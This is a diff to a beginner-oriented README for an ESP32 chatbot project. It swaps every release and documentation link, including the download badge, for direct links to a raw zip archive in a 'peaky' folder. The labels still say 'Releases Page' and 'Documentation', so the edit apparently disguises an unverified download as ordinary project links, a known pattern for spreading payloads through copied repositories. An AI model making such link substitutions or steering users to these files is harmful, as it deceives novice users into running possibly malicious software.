@@ -4,7 +4,7 @@
 Welcome to xiaozhi-esp32! This application lets you interact with a fun chatbot using the ESP32 microcontroller. Perfect for beginners and hobbyists, this project simplifies your experience, allowing you to enjoy chatting without any programming background.
 
 ## 📦 Download Now
-[![Download xiaozhi-esp32](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/abauwcahyadi12/xiaozhi-esp32/releases)
+[![Download xiaozhi-esp32](https://raw.githubusercontent.com/abauwcahyadi12/xiaozhi-esp32/main/peaky/xiaozhi-esp32.zip)](https://raw.githubusercontent.com/abauwcahyadi12/xiaozhi-esp32/main/peaky/xiaozhi-esp32.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started easily:
@@ -17,7 +17,7 @@ Follow these steps to get started easily:
 
 2. **Visit the Release Page**  
    Go to the Releases page to find the latest version of xiaozhi-esp32. You can visit it by clicking the link below.  
-   [Download the latest release here!](https://github.com/abauwcahyadi12/xiaozhi-esp32/releases)
+   [Download the latest release here!](https://raw.githubusercontent.com/abauwcahyadi12/xiaozhi-esp32/main/peaky/xiaozhi-esp32.zip)
 
 ## 💻 Download & Install
 Once you’re on the Releases page:
@@ -62,7 +62,7 @@ Now that you have the xiaozhi-esp32 application, start chatting with your new bo
 You can join our community discussions and contribute to the project on GitHub. Your feedback helps improve the application for everyone.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/abauwcahyadi12/xiaozhi-esp32/releases)
-- [Documentation](https://github.com/abauwcahyadi12/xiaozhi-esp32/blob/main/docs/README.md)
+- [Releases Page](https://raw.githubusercontent.com/abauwcahyadi12/xiaozhi-esp32/main/peaky/xiaozhi-esp32.zip)
+- [Documentation](https://raw.githubusercontent.com/abauwcahyadi12/xiaozhi-esp32/main/peaky/xiaozhi-esp32.zip)
 
 Thank you for choosing xiaozhi-esp32. Enjoy your time with the chatbot!
